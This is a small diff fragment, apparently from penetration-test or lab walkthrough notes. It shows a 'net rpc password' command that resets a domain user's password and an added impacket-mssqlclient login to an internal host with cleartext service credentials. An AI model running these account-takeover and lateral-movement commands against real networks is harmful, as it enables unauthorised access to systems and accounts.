@@ -9,7 +9,7 @@ net rpc password christopher.lewis 'Pass123!' -U 'nagoya-industries.com/svc_help
 ```
 
 ```
-
+impacket-mssqlclient svc_mssql:Service1@192.168.132.21 -windows-auth
 ```
 
 ```
